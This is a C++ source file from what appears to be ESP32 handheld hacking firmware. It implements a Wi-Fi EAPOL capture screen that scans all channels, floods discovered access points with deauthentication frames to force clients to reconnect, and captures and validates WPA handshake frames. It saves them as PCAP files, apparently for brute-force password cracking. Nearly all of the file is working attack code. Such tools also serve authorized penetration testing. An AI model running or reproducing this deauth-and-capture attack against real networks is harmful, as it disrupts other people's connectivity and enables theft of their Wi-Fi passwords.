#include "WifiEapolCaptureScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "core/AchievementManager.h"
#include "screens/wifi/WifiMenuScreen.h"
#include "ui/actions/InputNumberAction.h"
#include "ui/actions/ShowStatusAction.h"
#include "utils/StorageUtil.h"

#include "utils/network/WifiAttackUtil.h"
#include <cstring>

// ── Static definitions ────────────────────────────────────────────────────

const char* WifiEapolCaptureScreen::SAVE_DIR = "/unigeek/wifi/eapol";

WifiEapolCaptureScreen::RawCapture WifiEapolCaptureScreen::_ring[WifiEapolCaptureScreen::RING_SIZE] = {};
volatile int  WifiEapolCaptureScreen::_ringHead    = 0;
volatile int  WifiEapolCaptureScreen::_ringTail    = 0;
volatile bool WifiEapolCaptureScreen::_skipBeacons = false;

WifiEapolCaptureScreen::ApTarget WifiEapolCaptureScreen::_apTargets[WifiEapolCaptureScreen::MAX_TARGETS] = {};
int WifiEapolCaptureScreen::_apCount = 0;

std::unordered_map<
  WifiEapolCaptureScreen::MacAddr,
  WifiEapolCaptureScreen::EapolEntry,
  WifiEapolCaptureScreen::MacHash,
  WifiEapolCaptureScreen::MacEqual
> WifiEapolCaptureScreen::_eapolMap = {};

std::unordered_map<
  WifiEapolCaptureScreen::MacAddr,
  std::string,
  WifiEapolCaptureScreen::MacHash,
  WifiEapolCaptureScreen::MacEqual
> WifiEapolCaptureScreen::_ssidMap = {};

std::unordered_map<
  WifiEapolCaptureScreen::MacAddr,
  std::vector<std::vector<uint8_t>>,
  WifiEapolCaptureScreen::MacHash,
  WifiEapolCaptureScreen::MacEqual
> WifiEapolCaptureScreen::_pending = {};

std::unordered_map<
  WifiEapolCaptureScreen::MacAddr,
  std::vector<uint8_t>,
  WifiEapolCaptureScreen::MacHash,
  WifiEapolCaptureScreen::MacEqual
> WifiEapolCaptureScreen::_beaconStore = {};

// ── PCAP structs ──────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct PcapGlobalHdr {
  uint32_t magic    = 0xA1B2C3D4;
  uint16_t vmaj     = 2;
  uint16_t vmin     = 4;
  int32_t  tz       = 0;
  uint32_t sig      = 0;
  uint32_t snap     = 65535;
  uint32_t linktype = 105;   // LINKTYPE_IEEE802_11
};
struct PcapPktHdr {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};
#pragma pack(pop)

// ── Destructor ────────────────────────────────────────────────────────────

WifiEapolCaptureScreen::~WifiEapolCaptureScreen() {
  _skipBeacons = false;
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  esp_wifi_set_promiscuous(false);
  if (_attacker) {
    delete _attacker;
    _attacker = nullptr;
  }
  _eapolMap.clear();
  _ssidMap.clear();
  _pending.clear();
  _beaconStore.clear();
  _apCount  = 0;
  _ringHead = 0;
  _ringTail = 0;
}

// ── Status bar callback ───────────────────────────────────────────────────

void WifiEapolCaptureScreen::_statusBarCb(Sprite& sp, int barY, int width, void* userData) {
  auto* self = static_cast<WifiEapolCaptureScreen*>(userData);

  char countBuf[24];
  snprintf(countBuf, sizeof(countBuf), "Captured: %u", self->_handshakes);
  sp.setTextDatum(TL_DATUM);
  sp.setTextColor(self->_handshakes > 0 ? TFT_MAGENTA : TFT_DARKGREY);
  sp.drawString(countBuf, 2, barY);

  if (self->_lastEapolName[0] != '\0') {
    sp.setTextDatum(TR_DATUM);
    sp.setTextColor(TFT_CYAN);
    sp.drawString(self->_lastEapolName, width - 2, barY);
  }
}

// ── Lifecycle ─────────────────────────────────────────────────────────────

void WifiEapolCaptureScreen::onInit() {
  _phase = PHASE_MENU;
  _showMenu();
}

void WifiEapolCaptureScreen::_showMenu() {
  _discoverySub = String(_discoveryDwellMs) + " ms";
  _attackSub    = String(_attackDwellMs) + " ms";
  _deauthSub    = String(_maxDeauthAttempts);
  _menuItems[0] = {"Discovery Dwell", _discoverySub.c_str()};
  _menuItems[1] = {"Attack Dwell", _attackSub.c_str()};
  _menuItems[2] = {"Max Deauth", _deauthSub.c_str()};
  _menuItems[3] = {"Start"};
  setItems(_menuItems, 4);
}

void WifiEapolCaptureScreen::onItemSelected(uint8_t index) {
  if (_phase != PHASE_MENU) return;

  switch (index) {
    case 0:
      _discoveryDwellMs = InputNumberAction::popup("Discovery Dwell (ms)", 250, 10000, _discoveryDwellMs);
      _showMenu();
      break;
    case 1:
      _attackDwellMs = InputNumberAction::popup("Attack Dwell (ms)", 250, 10000, _attackDwellMs);
      _showMenu();
      break;
    case 2:
      _maxDeauthAttempts = InputNumberAction::popup("Max Deauth Attempts", 5, 30, _maxDeauthAttempts);
      _showMenu();
      break;
    case 3: {
      // Start capture
      _channel          = 0;
      _needRefresh      = false;
      _ringHead         = 0;
      _ringTail         = 0;
      _skipBeacons      = false;
      _apCount          = 0;
      _logView.clear();
      _totalEapol       = 0;
      _handshakes       = 0;
      _phase            = PHASE_DISCOVERY;
      _discoveryCount   = 0;
      _attackChanCount  = 0;
      _attackChanIdx    = 0;
      _deauthFired      = false;
      _chanDwellUntil   = 0;
      memset(_lastEapolName, 0, sizeof(_lastEapolName));

      _eapolMap.clear();
      _ssidMap.clear();
      _pending.clear();
      _beaconStore.clear();

      _storageOk     = false;
      _lastFreeCheck = 0;

      if (!Uni.Storage || !Uni.Storage->isAvailable()) {
        ShowStatusAction::show("No storage available.");
        Screen.setScreen(new WifiMenuScreen());
        return;
      }

      if (!StorageUtil::hasSpace()) {
        ShowStatusAction::show("Storage full! (<20KB free)");
        Screen.setScreen(new WifiMenuScreen());
        return;
      }

      Uni.Storage->makeDir(SAVE_DIR);
      _storageOk = true;

      int ne = Achievement.inc("wifi_eapol_capture_started");
      if (ne == 1) Achievement.unlock("wifi_eapol_capture_started");

      _logView.addLine("Discovery scan...", TFT_DARKGREY);

      _attacker = new WifiAttackUtil();
      esp_wifi_set_promiscuous(true);
      esp_wifi_set_promiscuous_rx_cb(&WifiEapolCaptureScreen::_promiscuousCb);

      render();
      break;
    }
  }
}

void WifiEapolCaptureScreen::onUpdate() {
  if (_phase == PHASE_MENU) { ListScreen::onUpdate(); return; }

  const unsigned long now = millis();

  _flush();   // process ring buffer first so APs are registered before deauth

  if (_phase == PHASE_DISCOVERY) {
    if (now >= _chanDwellUntil) {
      _channel = (_channel % 13) + 1;
      _attacker->setChannel(_channel);
      _discoveryCount++;

      char buf[44];
      snprintf(buf, sizeof(buf), "Scan CH%d", _channel);
      _logView.addLine(buf, TFT_DARKGREY);
      _chanDwellUntil = now + _discoveryDwellMs;
      render();

      if (_discoveryCount >= 13) {
        _discoveryCount = 0;
        _buildAttackChans();
        if (_attackChanCount > 0) {
          _phase        = PHASE_ATTACK;
          _skipBeacons  = true;   // stop beacons from evicting EAPOL in ring
          _attackChanIdx = 0;
          _logView.addLine("Attacking APs...", TFT_WHITE);
          _hopToAttackChan();
        } else {
          _logView.addLine("No APs, rescanning", TFT_DARKGREY);
          _channel = 0;   // restart from CH1 next dwell
        }
      }
    }

  } else {  // PHASE_ATTACK
    if (!_deauthFired) {
      _sendDeauth(_channel);
      _deauthFired    = true;
      _chanDwellUntil = now + _attackDwellMs;
      render();
    }

    if (now >= _chanDwellUntil) {
      // Check if any APs on this channel still need deauth
      bool channelDone = true;
      for (int i = 0; i < _apCount; i++) {
        if (_apTargets[i].channel != (uint8_t)_channel) continue;
        MacAddr mac;
        memcpy(mac.data(), _apTargets[i].bssid, 6);
        auto it = _eapolMap.find(mac);
        if (it != _eapolMap.end() && it->second.validated) continue;
        if (_apTargets[i].deauthCount >= _maxDeauthAttempts) continue;
        channelDone = false;
        break;
      }

      if (!channelDone) {
        _deauthFired = false;  // fire next deauth on same channel
      } else {
        _attackChanIdx++;
        if (_attackChanIdx >= _attackChanCount) {
          // All attack channels exhausted — reset incomplete APs and rescan
          for (int i = 0; i < _apCount; i++) {
            MacAddr mac;
            memcpy(mac.data(), _apTargets[i].bssid, 6);
            auto it = _eapolMap.find(mac);
            if (it != _eapolMap.end() && it->second.validated) continue;

            _apTargets[i].deauthCount = 0;

            if (it != _eapolMap.end()) {
              if (!it->second.filepath.empty())
                Uni.Storage->deleteFile(it->second.filepath.c_str());
              _eapolMap.erase(it);
            }
            _pending.erase(mac);
            _beaconStore.erase(mac);
            _ssidMap.erase(mac);
          }

          _phase          = PHASE_DISCOVERY;
          _skipBeacons    = false;
          _discoveryCount = 0;
          _channel        = 0;
          _chanDwellUntil = now;
          _logView.addLine("Rescanning...", TFT_WHITE);
          render();
        } else {
          _hopToAttackChan();
        }
      }
    }
  }

  if (_needRefresh) {
    _needRefresh = false;
    render();
  }

  if (Uni.Nav->wasPressed()) {
    auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) {
      onBack();
    }
  }
}

void WifiEapolCaptureScreen::onRender() {
  if (_phase == PHASE_MENU) { ListScreen::onRender(); return; }
  _logView.draw(Uni.Lcd, bodyX(), bodyY(), bodyW(), bodyH(), _statusBarCb, this);
}

void WifiEapolCaptureScreen::onBack() {
  Screen.setScreen(new WifiMenuScreen());
}

// ── Phase helpers ─────────────────────────────────────────────────────────

// Build the list of unique channels that still have APs needing more EAPOL.
void WifiEapolCaptureScreen::_buildAttackChans() {
  _attackChanCount = 0;
  for (int i = 0; i < _apCount; i++) {
    MacAddr mac;
    memcpy(mac.data(), _apTargets[i].bssid, 6);
    auto it = _eapolMap.find(mac);
    // Only skip if PCAP is confirmed valid: beacon + M1 + M2 all written to file
    if (it != _eapolMap.end() && it->second.validated) continue;
    if (_apTargets[i].deauthCount >= _maxDeauthAttempts) continue;

    uint8_t ch = _apTargets[i].channel;
    bool dup = false;
    for (int j = 0; j < _attackChanCount; j++) {
      if (_attackChans[j] == ch) { dup = true; break; }
    }
    if (!dup && _attackChanCount < 13) {
      _attackChans[_attackChanCount++] = ch;
    }
  }
}

// Hop to the current attack channel and arm timing/flags.
void WifiEapolCaptureScreen::_hopToAttackChan() {
  _channel     = _attackChans[_attackChanIdx];
  _attacker->setChannel(_channel);
  _deauthFired = false;

  char buf[44];
  snprintf(buf, sizeof(buf), "Attack CH%d [%d/%d]", _channel, _attackChanIdx + 1, _attackChanCount);
  _logView.addLine(buf, TFT_WHITE);
}

// ── Deauth injection ──────────────────────────────────────────────────────

void WifiEapolCaptureScreen::_registerApTarget(const MacAddr& bssid, uint8_t ch) {
  for (int i = 0; i < _apCount; i++) {
    if (memcmp(_apTargets[i].bssid, bssid.data(), 6) == 0) {
      _apTargets[i].channel = ch;
      return;
    }
  }
  if (_apCount < MAX_TARGETS) {
    memcpy(_apTargets[_apCount].bssid, bssid.data(), 6);
    _apTargets[_apCount].channel = ch;
    _apCount++;
  }
}

void WifiEapolCaptureScreen::_sendDeauth(int ch) {
  if (_apCount == 0 || !_attacker) return;

  int deauthed = 0;
  for (int i = 0; i < _apCount; i++) {
    if (_apTargets[i].channel != (uint8_t)ch) continue;

    MacAddr mac;
    memcpy(mac.data(), _apTargets[i].bssid, 6);
    auto it = _eapolMap.find(mac);
    if (it != _eapolMap.end() && it->second.validated) continue;
    if (_apTargets[i].deauthCount >= _maxDeauthAttempts) continue;

    for (int b = 0; b < 10; b++) {
      _attacker->deauthenticate(_apTargets[i].bssid, (uint8_t)ch);
    }
    _apTargets[i].deauthCount++;
    deauthed++;
  }

  if (deauthed > 0) {
    uint8_t maxCount = 0;
    for (int i = 0; i < _apCount; i++) {
      if (_apTargets[i].channel == (uint8_t)ch && _apTargets[i].deauthCount > maxCount)
        maxCount = _apTargets[i].deauthCount;
    }
    char buf[56];
    snprintf(buf, sizeof(buf), "Deauth CH%d (%d AP) [%d/%d]", ch, deauthed, maxCount, _maxDeauthAttempts);
    _logView.addLine(buf, TFT_YELLOW);
  }
}

// ── Storage free space guard ──────────────────────────────────────────────

bool WifiEapolCaptureScreen::_checkFreeSpace() {
  if (!_storageOk) return false;
  const unsigned long now = millis();
  if (now - _lastFreeCheck < 5000) return true;
  _lastFreeCheck = now;
  if (!StorageUtil::hasSpace()) {
    _storageOk = false;
    _logView.addLine("Storage full! Stopped.", TFT_RED);
    ShowStatusAction::show("Storage full!\nCapture stopped.", 2000);
    return false;
  }
  return true;
}

// ── PCAP helpers ──────────────────────────────────────────────────────────

std::string WifiEapolCaptureScreen::_sanitize(const std::string& s) {
  std::string out;
  out.reserve(s.size());
  for (char c : s) {
    if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
        (c >= '0' && c <= '9') || c == '-' || c == '.') {
      out += c;
    } else {
      out += '_';
    }
  }
  return out;
}

std::string WifiEapolCaptureScreen::_makePath(const MacAddr& bssid, const std::string& ssid) {
  char mac[13];
  snprintf(mac, sizeof(mac), "%02X%02X%02X%02X%02X%02X",
           bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
  std::string safe = _sanitize(ssid);
  if (safe.empty()) safe = "unknown";
  return std::string(SAVE_DIR) + "/" + mac + "_" + safe + ".pcap";
}

void WifiEapolCaptureScreen::_writePcapHeader(const std::string& path) {
  if (!_checkFreeSpace()) return;
  fs::File f = Uni.Storage->open(path.c_str(), FILE_WRITE);
  if (!f) return;
  PcapGlobalHdr hdr;
  f.write(reinterpret_cast<uint8_t*>(&hdr), sizeof(hdr));
  f.close();
}

void WifiEapolCaptureScreen::_appendPcapFrame(const std::string& path,
                                               const uint8_t* data, uint16_t len) {
  if (!_checkFreeSpace()) return;
  fs::File f = Uni.Storage->open(path.c_str(), FILE_APPEND);
  if (!f) return;
  PcapPktHdr ph;
  const unsigned long ms = millis();
  ph.ts_sec   = ms / 1000;
  ph.ts_usec  = (ms % 1000) * 1000;
  ph.incl_len = len;
  ph.orig_len = len;
  f.write(reinterpret_cast<uint8_t*>(&ph), sizeof(ph));
  f.write(data, len);
  f.close();
}

// ── EAPOL message type parser ─────────────────────────────────────────────

// Returns: 1=M1, 2=M2, 3=M3, 4=M4 (zero-nonce M2), 0=unknown.
static int _parseEapolMsg(const uint8_t* data, uint16_t len) {
  static const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  for (uint16_t i = 24; i + 16 <= len; i++) {
    bool match = true;
    for (int k = 0; k < 8; k++) { if (data[i + k] != snap[k]) { match = false; break; } }
    if (!match) continue;
    const uint8_t* e = data + i + 8;
    if (len < i + 8 + 49) return 0;     // need up to nonce end
    if (e[1] != 0x03) return 0;
    if (e[4] != 0x02) return 0;
    uint16_t ki  = ((uint16_t)e[5] << 8) | e[6];
    bool     ack = (ki & 0x0080) != 0;
    bool     mic = (ki & 0x0100) != 0;
    bool     ins = (ki & 0x0040) != 0;
    if  (ack && !mic)        return 1;  // M1
    if  (ack &&  mic)        return 3;  // M3
    if (!ack &&  mic && !ins) {
      // Distinguish M2 (non-zero nonce) from M4 (zero nonce)
      bool nonceZero = true;
      for (int z = 0; z < 32; z++) { if (e[17 + z] != 0) { nonceZero = false; break; } }
      return nonceZero ? 4 : 2;
    }
    return 0;
  }
  return 0;
}

// ── Handshake validation (in-memory pairing, same logic as brute force) ──

int WifiEapolCaptureScreen::_updateValidation(EapolEntry& entry,
                                                const uint8_t* data, uint16_t len) {
  static const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  if (len < 40) return 0;

  // Find SNAP header
  int snapOff = -1;
  for (uint16_t i = 24; i + 16 <= len; i++) {
    bool match = true;
    for (int k = 0; k < 8; k++) { if (data[i + k] != snap[k]) { match = false; break; } }
    if (match) { snapOff = i; break; }
  }
  if (snapOff < 0) return 0;

  const uint8_t* e = data + snapOff + 8;
  if (len < (uint16_t)(snapOff + 8 + 49)) return 0;
  if (e[1] != 0x03 || e[4] != 0x02) return 0;

  uint16_t ki  = ((uint16_t)e[5] << 8) | e[6];
  bool     ack = (ki & 0x0080) != 0;
  bool     mic = (ki & 0x0100) != 0;
  bool     ins = (ki & 0x0040) != 0;

  int msg = 0;
  if (ack && !mic)       msg = 1;
  else if (ack && mic)   msg = 3;
  else if (!ack && mic && !ins) {
    bool nonceZero = true;
    for (int z = 0; z < 32; z++) { if (e[17 + z] != 0) { nonceZero = false; break; } }
    msg = nonceZero ? 4 : 2;
  }
  if (msg == 0 || msg == 4) return msg;
  if (entry.validated) return msg;  // already confirmed — don't overwrite

  if (msg == 1 || msg == 3) {
    // M1/M3: store ANonce + STA MAC (addr1 = DA = STA in AP→STA direction)
    memcpy(entry.anonce, e + 17, 32);
    memcpy(entry.staMacM1, data + 4, 6);
    entry.hasAnonce = true;
    // Reverse pair: check if buffered M2 from same STA
    if (entry.hasM2Data && entry.beaconWritten &&
        memcmp(entry.staMacM1, entry.staMacM2, 6) == 0) {
      entry.validated = true;
    }
  } else if (msg == 2) {
    // M2: store SNonce + STA MAC (addr2 = SA = STA in STA→AP direction)
    memcpy(entry.m2Snonce, e + 17, 32);
    memcpy(entry.staMacM2, data + 10, 6);
    entry.hasM2Data = true;
    // Forward pair: check if have M1/M3 from same STA
    if (entry.hasAnonce && entry.beaconWritten &&
        memcmp(entry.staMacM1, entry.staMacM2, 6) == 0) {
      entry.validated = true;
    }
  }

  return msg;
}

// ── Main loop frame processor ─────────────────────────────────────────────

void WifiEapolCaptureScreen::_flush() {
  while (_ringTail != _ringHead) {
    const RawCapture& cap = _ring[_ringTail];
    _ringTail = (_ringTail + 1) % RING_SIZE;

    if (cap.isBeacon) {
      // Parse SSID from beacon IEs (802.11 header=24B + fixed params=12B = offset 36)
      bool newSsid = false;
      if (_ssidMap.find(cap.bssid) == _ssidMap.end() && cap.len >= 38) {
        uint16_t pos = 36;
        while (pos + 2 <= cap.len) {
          uint8_t id   = cap.data[pos];
          uint8_t elen = cap.data[pos + 1];
          if (pos + 2 + elen > cap.len) break;
          if (id == 0 && elen > 0 && elen <= 32) {
            _ssidMap.emplace(cap.bssid,
              std::string(reinterpret_cast<const char*>(cap.data + pos + 2), elen));
            newSsid = true;
            break;
          }
          pos += 2 + elen;
        }
      }

      // Register this AP for future deauth injections
      _registerApTarget(cap.bssid, cap.channel);

      // Store first beacon frame for later PCAP writing (skip if AP already validated)
      auto eIt = _eapolMap.find(cap.bssid);
      if ((eIt == _eapolMap.end() || !eIt->second.validated) &&
          _beaconStore.find(cap.bssid) == _beaconStore.end()) {
        _beaconStore.emplace(cap.bssid,
          std::vector<uint8_t>(cap.data, cap.data + cap.len));
      }

      // Log newly discovered AP
      if (newSsid) {
        auto ssidIt = _ssidMap.find(cap.bssid);
        if (ssidIt != _ssidMap.end()) {
          char buf[44];
          snprintf(buf, sizeof(buf), "AP: %s", ssidIt->second.c_str());
          _logView.addLine(buf, TFT_CYAN);
          _needRefresh = true;
        }
      }

      // If SSID just became available, flush buffered EAPOL frames
      auto ssidIt = _ssidMap.find(cap.bssid);
      if (ssidIt == _ssidMap.end()) continue;

      auto& entry = _eapolMap[cap.bssid];
      if (entry.ssid.empty()) entry.ssid = ssidIt->second;

      auto pendIt = _pending.find(cap.bssid);
      if (pendIt == _pending.end() || pendIt->second.empty()) continue;

      if (_storageOk && entry.filepath.empty()) {
        entry.filepath = _makePath(cap.bssid, entry.ssid);
        _writePcapHeader(entry.filepath);
        _appendPcapFrame(entry.filepath, cap.data, cap.len);
        entry.beaconWritten = true;
      }

      if (_storageOk && !entry.filepath.empty()) {
        bool wasValid = entry.validated;
        for (auto& frame : pendIt->second) {
          _appendPcapFrame(entry.filepath, frame.data(), (uint16_t)frame.size());
          _updateValidation(entry, frame.data(), (uint16_t)frame.size());
        }
        if (!wasValid && entry.validated) {
          _handshakes++;
          int nh = Achievement.inc("wifi_eapol_handshake_valid");
          if (nh == 1)  Achievement.unlock("wifi_eapol_handshake_valid");
          if (nh == 5)  Achievement.unlock("wifi_eapol_handshake_5");
          if (nh == 20) Achievement.unlock("wifi_eapol_handshake_20");
          if (nh == 50) Achievement.unlock("wifi_eapol_handshake_50");
          char buf2[44];
          snprintf(buf2, sizeof(buf2), "Captured! %s", entry.ssid.c_str());
          _logView.addLine(buf2, TFT_MAGENTA);
          _needRefresh = true;
          _beaconStore.erase(cap.bssid);  // beacon already in PCAP, free memory
        }
      }
      _pending.erase(pendIt);

    } else {
      // EAPOL frame
      auto& entry  = _eapolMap[cap.bssid];

      // Skip processing if this AP already has a validated handshake
      if (entry.validated) continue;

      auto  ssidIt = _ssidMap.find(cap.bssid);
      int msg = _parseEapolMsg(cap.data, cap.len);
      bool hasSsid = (ssidIt != _ssidMap.end());

      bool wasValid = false;  // entry.validated is false here (checked above)
      bool written = false;
      if (hasSsid) {
        if (entry.ssid.empty()) entry.ssid = ssidIt->second;
        if (_storageOk && entry.filepath.empty()) {
          entry.filepath = _makePath(cap.bssid, entry.ssid);
          _writePcapHeader(entry.filepath);
          auto bcnIt = _beaconStore.find(cap.bssid);
          if (bcnIt != _beaconStore.end()) {
            _appendPcapFrame(entry.filepath, bcnIt->second.data(), (uint16_t)bcnIt->second.size());
            entry.beaconWritten = true;
            _beaconStore.erase(bcnIt);
          }
        }
        if (_storageOk && !entry.filepath.empty()) {
          _appendPcapFrame(entry.filepath, cap.data, cap.len);
          written = true;
        }
      } else {
        auto& pend = _pending[cap.bssid];
        if ((int)pend.size() < MAX_PENDING) {
          pend.emplace_back(cap.data, cap.data + cap.len);
        }
      }

      // Validate handshake pairing (extract nonces + MACs, try M1+M2 pairing)
      if (written) {
        _updateValidation(entry, cap.data, cap.len);
      }

      entry.count++;
      _totalEapol++;

      // Determine display name
      const char* apName = nullptr;
      char macBuf[18];
      if (ssidIt != _ssidMap.end() && !ssidIt->second.empty()) {
        apName = ssidIt->second.c_str();
      } else {
        snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
                 cap.bssid[0], cap.bssid[1], cap.bssid[2],
                 cap.bssid[3], cap.bssid[4], cap.bssid[5]);
        apName = macBuf;
      }

      strncpy(_lastEapolName, apName, sizeof(_lastEapolName) - 1);
      _lastEapolName[sizeof(_lastEapolName) - 1] = '\0';

      char buf[44];
      static const char* msgName[] = {"EAPOL", "M1", "M2", "M3", "M4"};
      const char* mLabel = (msg >= 1 && msg <= 4) ? msgName[msg] : msgName[0];
      snprintf(buf, sizeof(buf), "%s: %s", mLabel, apName);
      uint16_t logColor = (msg == 2 || msg == 4) ? TFT_GREEN : TFT_YELLOW;
      _logView.addLine(buf, logColor);

      // Count handshake when validation first confirms a valid pair
      if (entry.validated && !wasValid) {
        _handshakes++;
        int nh = Achievement.inc("wifi_eapol_handshake_valid");
        if (nh == 1)  Achievement.unlock("wifi_eapol_handshake_valid");
        if (nh == 5)  Achievement.unlock("wifi_eapol_handshake_5");
        if (nh == 20) Achievement.unlock("wifi_eapol_handshake_20");
        if (nh == 50) Achievement.unlock("wifi_eapol_handshake_50");
        snprintf(buf, sizeof(buf), "Captured! %s", apName);
        _logView.addLine(buf, TFT_MAGENTA);
        // Free memory — beacon and pending no longer needed
        _beaconStore.erase(cap.bssid);
        _pending.erase(cap.bssid);
      }

      _needRefresh = true;
      if (Uni.Speaker) Uni.Speaker->beep();
    }
  }
}

// ── Promiscuous callback ───────────────────────────────────────────────────

void WifiEapolCaptureScreen::_promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (buf == nullptr) return;
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;

  const auto     pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* pay = pkt->payload;
  const uint16_t len = (uint16_t)pkt->rx_ctrl.sig_len;

  if (len < 24) return;

  const uint16_t fc     = (uint16_t)pay[0] | ((uint16_t)pay[1] << 8);
  const uint8_t  fcType = (fc & 0x000C) >> 2;
  const uint8_t  fcSub  = (fc & 0x00F0) >> 4;

  // ── Beacon (management type=0, subtype=8) ─────────────────────────────
  if (fcType == 0 && fcSub == 8 && len >= 36) {
    if (_skipBeacons) return;  // attack phase: keep ring free for EAPOL
    int next = (_ringHead + 1) % RING_SIZE;
    if (next == _ringTail) return;

    RawCapture& slot = _ring[_ringHead];
    memcpy(slot.bssid.data(), pay + 16, 6);
    uint16_t copyLen = len > MAX_FRAME ? MAX_FRAME : len;
    memcpy(slot.data, pay, copyLen);
    slot.len      = copyLen;
    slot.channel  = pkt->rx_ctrl.channel;
    slot.isBeacon = true;
    _ringHead     = next;
    return;
  }

  // ── Data frame (type=2) — search for SNAP+EAPOL ───────────────────────
  if (fcType != 2) return;

  const uint8_t toDs   =  pay[1] & 0x01;
  const uint8_t fromDs = (pay[1] & 0x02) >> 1;

  MacAddr bssid{};
  if (toDs && !fromDs) {
    memcpy(bssid.data(), pay + 4, 6);
  } else if (!toDs && fromDs) {
    memcpy(bssid.data(), pay + 10, 6);
  } else {
    memcpy(bssid.data(), pay + 16, 6);
  }

  const uint8_t snap[8] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  for (uint16_t i = 24; i + 9 <= len; i++) {
    bool match = true;
    for (int k = 0; k < 8; k++) {
      if (pay[i + k] != snap[k]) { match = false; break; }
    }
    if (!match) continue;

    if (pay[i + 9] != 0x03) return;

    int next = (_ringHead + 1) % RING_SIZE;
    if (next == _ringTail) return;

    RawCapture& slot = _ring[_ringHead];
    memcpy(slot.bssid.data(), bssid.data(), 6);
    uint16_t copyLen = len > MAX_FRAME ? MAX_FRAME : len;
    memcpy(slot.data, pay, copyLen);
    slot.len      = copyLen;
    slot.channel  = pkt->rx_ctrl.channel;
    slot.isBeacon = false;
    _ringHead     = next;
    return;
  }
}
